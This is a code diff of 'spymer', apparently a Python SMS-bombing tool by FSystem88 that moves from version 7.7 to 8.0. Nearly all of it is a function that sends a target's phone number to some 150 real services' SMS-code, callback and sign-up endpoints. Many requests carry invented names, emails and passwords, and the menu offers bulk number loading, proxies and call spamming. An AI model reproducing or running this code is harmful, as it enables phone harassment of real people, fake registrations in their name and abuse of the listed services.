@@ -1,1090 +1,757 @@
 #!/usr/bin/python3
 # spymer v7.7
 # Author: FSystem88
-import requests
-import random
-import datetime
-import sys
-import time
-import argparse
 import os
-import json
-from colorama import Fore, Back, Style
+def MAIN():
+	try:
+		import requests
+		import random
+		import datetime
+		import sys
+		import re
+		import time
+		import argparse
+		import json
+		import threading
+		import proxyscrape
+		from threading import Thread
+		from colorama import Fore, Back, Style
+		from random import randint
+		def Main():
+			global phone
+			global info
+			global proxy
+			global ssl
+			global proxies
 
-os.system('cls' if os.name=='nt' else 'clear')
+			def mask(str, maska):
+				if len(str) == maska.count('#'):
+					str_list = list(str)
+					for i in str_list:
+						maska=maska.replace("#", i, 1)
+					return maska
+				else:
+					pass
 
-
-def Main():
-	global info
-	global proxy
-	ver = '77'
-	version = requests.post("https://fsystem88.ru/spymer/version.php").json()["version"]
-	if int(ver) < int(version):
-		info = Back.RED+"\nВерсия устарела и нуждается в обновлении!"+Style.RESET_ALL
-	else:
-		info = " "
-	proxy = "localhost"
-	logo = Fore.GREEN+"8888888888888888888888888\n8888888888888888888888888\n888        888        888\n888  888888888  8888  888\n888  888888888  888888888\n888        888        888\n888  888888888888888  888\n888  888888888  8888  888\n888  888888888        888\n8888888888888888888888888\n8888888888888888888888888\n8888    FSystem88    8888\n8888   SMS Spammer   8888\n8888      v.7.7      8888\n8888     MPL-2.0     8888\n8888888888888888888888888\n8888888888888888888888888"+Style.RESET_ALL
-	def main():
-		global info
-		global proxy		
-		global ip
-		global port
-		while True:
-			os.system('cls' if os.name=='nt' else 'clear')
-			print(logo)
-			print(info)
-			print("Proxy: "+Fore.BLUE+"{}".format(proxy)+Style.RESET_ALL)
-			print ("1) СМС спамер.")
-			print("2) Добавить телефон в антиспам лист.")
-			print("3) Проверить телефон в антиспам листе.")
-			print("4) Спамер звонков (beta, RU).")
-			print("5) Обновить прокси.")
-			print("6) Обновить SPYMER.")
-			print("7) Выход.")
-			input1 = input(Fore.BLUE+"Введите номер пункта: "+Style.RESET_ALL)
-			if input1 == "1":
+			def sms():
+				global phone
+				global name
+				global password
+				global email
+				global proxies
+				phone9 = phone[1:]
+				try:
+					try:
+						a=random.choice(list('123456789'))
+						phone=mask(str=phone, maska="+# (###) ###-##-##")
+						requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":name,"surname":name,"patronymic":name,"sex":"m","birthdate":"0{}.0{}.199{}".format(a,a,a),"phone":phone,"email":email,"city":"moscow"})
+					except:
+						pass
+					try:
+						requests.post("https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/",headers={"Referer": "https://alpari.com/en/registration/"},json={"client_type": "personal","email": email,"mobile_phone": phone,"deliveryOption": "sms"})
+					except:
+						pass
+					try:
+						requests.post("https://alfalife.cc/auth.php", data={"phone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone})
+					except:
+						pass
+					try:
+						phone=phone[1:]
+						phone=mask(str=phone, maska="8(###)###-##-##")
+						requests.post("http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax.php?do=sms_code",data={"phone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone},)
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="+# (###) ###-##-##")
+						requests.post("https://yaponchik.net/login/login.php",data={"login": "Y","countdown": 0,"step": "phone","redirect": "/profile/","phone": phone,})
+					except:
+						pass
+					try:
+						requests.post("https://eda.yandex/api/v1/user/request_authentication_code",json={"phone_number": "+"+phone})
+					except:
+						pass
+					try:
+						requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": phone, "type": 2},)
+					except:
+						pass
+					try:
+						requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn": phone},headers={"App-ID": "cabinet"},)
+					except:
+						pass
+					try:
+						requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName": name,"firstName": name,"middleName": name,"mobilePhone": phone,"email": email,"smsCode": ""})
+					except:
+						pass
+					try:
+						requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://pay.visa.ru/api/Auth/code/request",json={"phoneNumber": "+"+phone})
+					except:
+						pass
+					try:
+						requests.get("https://vezitaxi.com/api/employment/getsmscode",params={"phone": "+" + phone,"city": 561,"callback": "jsonp_callback_35979"})
+					except:
+						pass
+					try:
+						requests.post("https://b.utair.ru/api/v1/login/", data={"login": "+"+phone})
+					except:
+						pass
+					try:
+						requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",json={"phone": "+" + phone,"first_name": "-","utm_data": {},"via": "call",})
+					except:
+						pass
+					try:
+						requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",json={"phone": "+"+phone,"first_name": "-","utm_data": {},"via": "sms"})
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="+# (###) ###-##-##")
+						requests.post("https://www.r-ulybka.ru/login/ajax.php",data={"action": "sendcode","phone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone},)
+					except:
+						pass
+					try:
+						requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth",json={"doc": {"auth": {"mphone": "+" + phone,"bdate": "11.11.1999","deviceid": "00100","version": "1.0","source": "site","signature": "undefined",}}},headers={"Accept": "application/json"})
+					except:
+						pass
+					try:
+						d='0'
+						d=d+random.choice(list('123456789'))
+						m='0'
+						m=m+random.choice(list('123456789'))
+						requests.post("https://passport.twitch.tv/register?trusted_request=true",json={"birthday": {"day": int(d), "month": int(m), "year": 2000},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp","include_verification_code": True,"password": password,"phone_number": phone,"username": name})
+					except:
+						pass
+					try:
+						requests.post("https://www.tvoyaapteka.ru/bitrix/ajax/form_user_new.php?confirm_register=1",data={"tel": "+"+phone, "change_code": 1})
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="+# (###) ###-##-##")
+						requests.post("https://www.top-shop.ru/login/loginByPhone/",data={"phone": phone})
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="8(###)###-##-##")
+						requests.post("https://topbladebar.ru/user_account/ajax.php?do=sms_code",data={"phone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://api.tinkoff.ru/v1/sign_up", data={"phone": "+"+phone})
+					except:
+						pass
+					try:
+						requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number": phone},)
+					except:
+						pass
+					try:
+						requests.post("https://m.tiktok.com/node/send/download_link",json={"slideVerify": 0,"language": "en","PhoneRegin": '7',"Mobile": phone,"page": {"af_adset_id": 0, "pid": 0}})
+					except:
+						pass
+					try:
+						requests.post("https://thehive.pro/auth/signup", json={"phone": "+"+phone})
+					except:
+						pass
+					try:
+						requests.post("https://msk.tele2.ru/api/validation/number/"+phone, json={"sender": "Tele2"},)
+					except:
+						pass
+					try:
+						requests.post("https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",data={"RECALL": "Y", "BACK_CALL_PHONE": phone},)
+					except:
+						pass
+					try:
+						requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php",data={"action": "callback_phonenumber", "phone": phone})
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="(+#)##########")
+						requests.post("https://www.tanuki.ru/api/",json={"header": {"version": "2.0","userId": f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}","agent": {"device": "desktop", "version": "undefined undefined"},"langId": "1","cityId": "9",},"method": {"name": "sendSmsCode"},"data": {"phone": phone, "type": 1}})
+					except:
+						pass
+					try:
+						requests.post("https://lk.tabris.ru/reg/", data={"action": "phone", "phone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://tabasko.su/",data={"IS_AJAX": "Y","COMPONENT_NAME": "AUTH","ACTION": "GET_CODE","LOGIN": phone,})
+					except:
+						pass
+					try:
+						requests.post("https://www.sushi-profi.ru/api/order/order-call/",json={"phone": phone9, "name": name},)
+					except:
+						pass
+					try:
+						requests.post("https://client-api.sushi-master.ru/api/v1/auth/init",json={"phone": phone})
+					except:
+						pass
+					try:
+						phone=mask(str=phone9, maska="8(###)###-##-##")
+						requests.post("https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code",data={"phone": phone})
+					except:
+						pass
+					try:
+						phone=mask(str=phone9, maska="8 (###) ###-##-##")
+						requests.post("http://sushigourmet.ru/auth",data={"phone": phone, "stage": 1})
+					except:
+						pass
+					try:
+						requests.post("https://sushifuji.ru/sms_send_ajax.php",data={"name": "false", "phone": phone})
+					except:
+						pass
+					try:
+						requests.get("https://auth.pizza33.ua/ua/join/check/",params={"callback": "angular.callbacks._1","email": email,"password": password,"phone": phone9,"utm_current_visit_started": 0,"utm_first_visit": 0,"utm_previous_visit": 0,"utm_times_visited": 0})
+					except:
+						pass
+					try:
+						requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": phone},)
+					except:
+						pass
+					try:
+						requests.get("https://suandshi.ru/mobile_api/register_mobile_user",params={"phone": phone,},)
+					except:
+						pass
+					try:
+						phone=mask(str=phone9, maska="8-###-###-##-##")
+						requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "registration","tpl": "restore_password","phone": phone})
+					except:
+						pass
+					try:
+						requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": phone})
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="+# (###) ###-##-##")
+						requests.get("https://www.sportmaster.ru/user/session/sendSmsCode.do", params={"phone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",data={"demo_number": "+" + phone, "ajax_demo_send": "1"})
+					except:
+						pass
+					try:
+						requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+"+phone, "action": "confirm_mobile"})
+					except:
+						pass
+					try:
+						requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+"+phone, "resend": 0})
+					except:
+						pass
+					try:
+						requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "RegistrationSendSms","variables": {"phoneNumber": "+"+phone},"query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",})
+					except:
+						pass
+					try:
+						requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "sendResetPasswordSms","variables": {"phoneNumber": "+"+phone},"query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n"})
+					except:
+						pass
+					try:
+						requests.post("https://sayoris.ru/?route=parse/whats", data={"phone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://api.saurisushi.ru/Sauri/api/v2/auth/login",data={"data": {"login":phone9,"check":True,"crypto":{"captcha":"739699"}}})
+					except:
+						pass
+					try:
+						requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",json={"phone": "+"+phone})
+					except:
+						pass
+					try:
+						requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"},)
+					except:
+						pass
+					try:
+						requests.post("https://rieltor.ua/api/users/register-sms/",json={"phone": phone, "retry": 0},)
+					except:
+						pass
+					try:
+						requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php",data={"phone": "+"+phone})
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="+#(###)###-##-##")
+						requests.post("https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/",data={"phone": phone, "alien": "0"})
+					except:
+						pass
+					try:
+						requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",params={"number": phone})
+					except:
+						pass
+					try:
+						requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": phone})
+					except:
+						pass
+					try:
+						requests.get("https://sso.cloud.qlean.ru/http/users/requestotp",headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},params={"phone": phone,"clientId": "undefined","sessionId": str(randint(5000, 9999))})
+					except:
+						pass
+					try:
+						requests.post("https://www.prosushi.ru/php/profile.php",data={"phone": "+"+phone, "mode": "sms"})
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="+#-###-###-##-##")
+						requests.post("https://api.pozichka.ua/v1/registration/send",json={"RegisterSendForm": {"phone": phone}})
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="+# (###) ###-##-##")
+						requests.post("https://butovo.pizzapomodoro.ru/ajax/user/auth.php",data={"AUTH_ACTION": "SEND_USER_CODE","phone": phone})
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="+# (###) ###-##-##")
+						requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",data={"phone": phone})
+					except:
+						pass
+					try:
+						requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": phone})
+					except:
+						pass
+					try:
+						phone=mask(str=phone9, maska="8-###-###-##-##")
+						requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "call_me","task": "request_call","name": name,"phone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://pizzasinizza.ru/api/phoneCode.php", json={"phone": phone9})
+					except:
+						pass
+					try:
+						requests.post("https://pizzakazan.com/auth/ajax.php",data={"phone": "+"+phone, "method": "sendCode"})
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="+# (###) ###-####")
+						requests.post("https://pizza46.ru/ajaxGet.php",data={"phone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",data={"telephone": "+"+phone},)
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="+#-###-###-##-##")
+						requests.post("https://paylate.ru/registry",data={"mobile": phone,"first_name": name,"last_name": name,"nick_name": name,"gender-client": 1,"email": email,"action": "registry"})
+					except:
+						pass
+					try:
+						requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",data={"telephone": "8"+phone9})
+					except:
+						pass
+					try:
+						requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": phone, "otpId": 0})
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="+# (###) ###-####")
+						requests.post("https://www.osaka161.ru/local/tools/webstroy.webservice.php",data={"name": "Auth.SendPassword","params[0]": phone})
+					except:
+						pass
+					try:
+						requests.post("https://ontaxi.com.ua/api/v2/web/client",json={"country": "UA","phone": phone[3:]})
+					except:
+						pass
+					try:
+						requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": phone})
+					except:
+						pass
+					try:
+						requests.post(
+							"https://www.ollis.ru/gql",
+							json={{"query":"mutation { phone(number:\""+phone+"\", locale:ru) { token error { code message } } }"}})
+					except:
+						pass
+					try:
+						phone=mask(str=phone9, maska="8 (###) ###-##-##")
+						requests.get("https://okeansushi.ru/includes/contact.php",params={"call_mail": "1","ajax": "1","name": name,"phone": phone,"call_time": "1","pravila2": "on"})
+					except:
+						pass
+					try:
+						requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+"+phone})
+					except:
+						pass
+					try:
+						requests.post("https://nn-card.ru/api/1.0/covid/login", json={"phone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://www.nl.ua",data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": phone,"registration": "N"})
+					except:
+						pass
+					try:
+						requests.post("https://www.niyama.ru/ajax/sendSMS.php",data={"REGISTER[PERSONAL_PHONE]": phone,"code": "","sendsms": "Выслать код"})
+					except:
+						pass
+					try:
+						requests.post("https://account.my.games/signup_send_sms/", data={"phone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://auth.multiplex.ua/login", json={"login": phone})
+					except:
+						pass
+					try:
+						requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": phone})
+					except:
+						pass
+					try:
+						requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name,"phone": phone,"email": email})
+					except:
+						pass
+					try:
+						requests.post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php",data={"name": name, "phone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+"+phone},)
+					except:
+						pass
+					try:
+						requests.post("https://moneyman.ru/registration_api/actions/send-confirmation-code",data="+"+phone)
+					except:
+						pass
+					try:
+						requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",json={"FirstName": name, "CellPhone": phone, "Package": "optimal"})
+					except:
+						pass
+					try:
+						requests.post("https://mobileplanet.ua/register",data={"klient_name": name,"klient_phone": "+"+phone,"klient_email": email})
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="+# (###) ### ## ##")
+						requests.get(f"http://mnogomenu.ru/office/password/reset/"+phone)
+					except:
+						pass
+					try:
+						requests.get("https://my.mistercash.ua/ru/send/sms/registration",params={"number": "+"+phone})
+					except:
+						pass
+					try:
+						requests.get("https://menza-cafe.ru/system/call_me.php",params={"fio": name, "phone": phone, "phone_number": "1"})
+					except:
+						pass
+					try:
+						requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",data={"user_info[fullname]": name,"user_info[phone]": phone,"user_info[email]": email,"user_info[password]": password,"user_info[conf_password]": password})
+					except:
+						pass
+					try:
+						requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",data={"phone": phone, "do": "phone"})
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="+# ### ### ## ##")
+						requests.get("https://makimaki.ru/system/callback.php",params={"cb_fio": name,"cb_phone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",data={"data": phone, "metod": "postreg"})
+					except:
+						pass
+					try:
+						requests.post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code",json={"phone": phone},headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9"})
+					except:
+						pass
+					try:
+						requests.post("https://loany.com.ua/funct/ajax/registration/code",data={"phone":phone})
+					except:
+						pass
+					try:
+						requests.post("https://rubeacon.com/api/app/5ea871260046315837c8b6f3/middle",json={"url": "/api/client/phone_verification","method": "POST","data": {"client_id": 5646981, "phone": phone, "alisa_id": 1},"headers": {"Client-Id": 5646981,"Content-Type": "application/x-www-form-urlencoded"}})
+					except:
+						pass
+					try:
+						requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": "+"+phone})
+					except:
+						pass
+					try:
+						requests.post("https://koronapay.com/transfers/online/api/users/otps",data={"phone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms",headers={"Agent": "website"},json={"Phone":phone, "Type": 1})
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="# (###) ###-##-##")
+						requests.post("https://kilovkusa.ru/ajax.php",params={"block": "auth", "action": "send_register_sms_code", "data_type": "json"},data={"phone": phone })
+					except:
+						pass
+					try:
+						requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+"+phone})
+					except:
+						pass
+					try:
+						requests.post("https://kaspi.kz/util/send-app-link", data={"address": phone9})
+					except:
+						pass
+					try:
+						requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://izi.ua/api/auth/register",json={"phone": "+"+phone,"name": name,"is_terms_accepted": True})
+					except:
+						pass
+					try:
+						requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+"+phone})
+					except:
+						pass
+					try:
+						requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone":phone})
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="+## (###) ###-##-##")
+						requests.post("https://iqlab.com.ua/session/ajaxregister",data={"cellphone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data={"password": password,"application": "lkp","login": "+"+phone})
+					except:
+						pass
+					try:
+						requests.post("https://www.ingos.ru/api/v1/lk/auth/register/fast/step2",headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},json={"Birthday": "1986-07-10T07:19:56.276+02:00","DocIssueDate": "2004-02-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999),"DocSeries": randint(5000, 9999),"FirstName": name,"Gender": "M","LastName": name,"SecondName": name,"Phone": phone9,"Email": email})
+					except:
+						pass
+					try:
+						requests.post("https://informatics.yandex/api/v1/registration/confirmation/phone/send/",data={"country": "RU","csrfmiddlewaretoken": "","phone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request","phone": "+"+phone,"phone_permission": "unknown","stream_id": 0,"v": 3,"appversion": "3.20.6","osversion": "unknown","devicemodel": "unknown"})
+					except:
+						pass
+					try:
+						requests.post("https://api.imgur.com/account/v1/phones/verify",json={"phone_number": phone, "region_code": "RU"})
+					except:
+						pass
+					try:
+						requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"})
+					except:
+						pass
+					try:
+						requests.get("https://api.hmara.tv/stable/entrance", params={"contact": phone})
+					except:
+						pass
+					try:
+						requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": phone, "platform": "PISWeb"})
+					except:
+						pass
+					try:
+						requests.post("https://www.hatimaki.ru/register/",data={"REGISTER[LOGIN]": phone,"REGISTER[PERSONAL_PHONE]": phone,"REGISTER[SMS_CODE]": "","resend-sms": "1","REGISTER[EMAIL]": "","register_submit_button": "Зарегистрироваться"})
+					except:
+						pass
+					try:
+						requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": phone9}},)
+					except:
+						pass
+					try:
+						requests.post("https://crm.getmancar.com.ua/api/veryfyaccount",json={"phone": "+"+phone,"grant_type": "password","client_id": "gcarAppMob","client_secret": "SomeRandomCharsAndNumbersMobile"})
+					except:
+						pass
+					try:
+						requests.post("https://friendsclub.ru/assets/components/pl/connector.php",data={"casePar": "authSendsms", "MobilePhone": "+"+phone})
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="+# (###) ###-##-##")
+						requests.post("https://foodband.ru/api?call=calls",data={"customerName": name,"phone": phone,"g-recaptcha-response": ""})
+					except:
+						pass
+					try:
+						requests.get("https://foodband.ru/api/",params={"call": "customers/sendVerificationCode","phone": phone9,"g-recaptcha-response": ""})
+					except:
+						pass
+					try:
+						requests.post("https://www.flipkart.com/api/5/user/otp/generate",headers={"Origin": "https://www.flipkart.com","X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},data={"loginId": "+"+phone})
+					except:
+						pass
+					try:
+						requests.post("https://www.flipkart.com/api/6/user/signup/status",headers={"Origin": "https://www.flipkart.com","X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},json={"loginId": "+"+phone, "supportAllStates": True})
+					except:
+						pass
+					try:
+						requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+"+phone})
+					except:
+						pass
+					try:
+						requests.get("https://findclone.ru/register", params={"phone": "+"+phone})
+					except:
+						pass
+					try:
+						requests.post("https://www.finam.ru/api/smslocker/sendcode",data={"phone": "+"+phone})
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="+# (###) ###-##-##")
+						requests.post("https://2407.smartomato.ru/account/session",json={"phone": phone,"g-recaptcha-response": None})
+					except:
+						pass
+					try:
+						requests.post("https://www.etm.ru/cat/runprog.html",data={"m_phone":phone9,"mode": "sendSms","syf_prog": "clients-services","getSysParam": "yes"})
+					except:
+						pass
+					try:
+						requests.get("https://api.eldorado.ua/v1/sign/",params={"login": phone,"step": "phone-check","fb_id": "null","fb_token": "null","lang": "ru"})
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="+## (###) ###-##-##")
+						requests.post("https://e-groshi.com/online/reg",data={"first_name": name,"last_name": name,"third_name": name,"phone": phone,"password": password,"password2": password})
+					except:
+						pass
+					try:
+						requests.post("https://vladimir.edostav.ru/site/CheckAuthLogin",data={"phone_or_email": "+"+phone})
+					except:
+						pass
+					try:
+						requests.post("https://api.easypay.ua/api/auth/register",json={"phone": phone, "password": password})
+					except:
+						pass
+					try:
+						requests.post("https://my.dianet.com.ua/send_sms/", data={"phone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phone, "SignupForm[device_type]": 3})
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="+# (###) ###-##-##")
+						requests.post("https://api.creditter.ru/confirm/sms/send",json={"phone": phone,"type": "register"})
+					except:
+						pass
+					try:
+						requests.post("https://clients.cleversite.ru/callback/run.php",data={"siteid": "62731","num":phone,"title": "Онлайн-консультант","referrer": "https://m.cleversite.ru/call"})
+					except:
+						pass
+					try:
+						requests.post("https://city24.ua/personalaccount/account/registration",data={"PhoneNumber": phone})
+					except:
+						pass
+					try:
+						requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/")
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="+# (###) ###-##-##")
+						requests.post("https://cinema5.ru/api/phone_code",data={"phone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://api.cian.ru/sms/v1/send-validation-code/",json={"phone": "+"+phone, "type": "authenticateCode"})
+					except:
+						pass
+					try:
+						requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone","variables": {"phone": phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
+					except:
+						pass
+					try:
+						requests.get("https://it.buzzolls.ru:9995/api/v2/auth/register",params={"phoneNumber": "+"+phone,},headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3"})
+					except:
+						pass
+					try:
+						phone=mask(str=phone9, maska="(###)###-##-##")
+						requests.post("https://bluefin.moscow/auth/register/",data={"phone": phone, "sendphone": "Далее"})
+					except:
+						pass
+					try:
+						requests.post("https://app.benzuber.ru/login", data={"phone": "+"+phone})
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="+# (###) ###-##-##")
+						requests.post("https://bartokyo.ru/ajax/login.php",data={"user_phone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://bamper.by/registration/?step=1",data={"phone": "+"+phone,"submit": "Запросить смс подтверждения","rules": "on"})
+					except:
+						pass
+					try:
+						phone=mask(str=phone9, maska="(###) ###-##-##")
+						requests.get("https://avtobzvon.ru/request/makeTestCall",params={"to": phone})
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="+# (###) ###-##-##")
+						requests.post("https://oauth.av.ru/check-phone",json={"phone": phone})
+					except:
+						pass
+					try:
+						requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone})
+					except:
+						pass
+					try:
+						phone=mask(str=phone, maska="+# (###) ###-##-##")
+						requests.post("https://apteka.ru/_action/auth/getForm/",data={"form[NAME]": "","form[PERSONAL_GENDER]": "","form[PERSONAL_BIRTHDAY]": "","form[EMAIL]": "","form[LOGIN]": phone,"form[PASSWORD]": password,"get-new-password": "Получите пароль по SMS","user_agreement": "on","personal_data_agreement": "on","formType": "simple","utc_offset": "120"})
+					except:
+						pass
+				except:
+					pass
+				
+			def clear():
 				os.system('cls' if os.name=='nt' else 'clear')
+				pass
+
+			def checkver():
+				global info
+				ver = '80'
+				version = requests.post("https://fsystem88.ru/spymer/version.php").json()["version"]
+				if int(ver) < int(version):
+					info=Back.RED+"\nВерсия устарела и нуждается в обновлении!"+Style.RESET_ALL
+
+			def logo():
+				logo = Fore.GREEN+"8888888888888888888888888\n8888888888888888888888888\n888        888        888\n888  888888888  8888  888\n888  888888888  888888888\n888        888        888\n888  888888888888888  888\n888  888888888  8888  888\n888  888888888        888\n8888888888888888888888888\n8888888888888888888888888\n8888    FSystem88    8888\n8888   SMS Spammer   8888\n8888      v.8.0      8888\n8888     MPL-2.0     8888\n8888888888888888888888888\n8888888888888888888888888"+Style.RESET_ALL
 				print(logo)
-				print(info)
-				print("Выберите один вариант:")
-				print("1. Запустить спамер на один номер")
-				print("2. Выгрузить номера из TXT файла ")
-				print("3. Выгрузить номера по токену")
-				input11= input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
-				if input11 == "3":
-					try:
-						os.system('cls' if os.name=='nt' else 'clear')
-						print(logo)
-						print(info)
-						print("Введите токен: ")
-						print("Загрузить файл и получить токен можно по ссылке:")
-						print(Fore.GREEN+"http://FSystem88.ru/spymer/\n"+Style.RESET_ALL)
-						token=input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
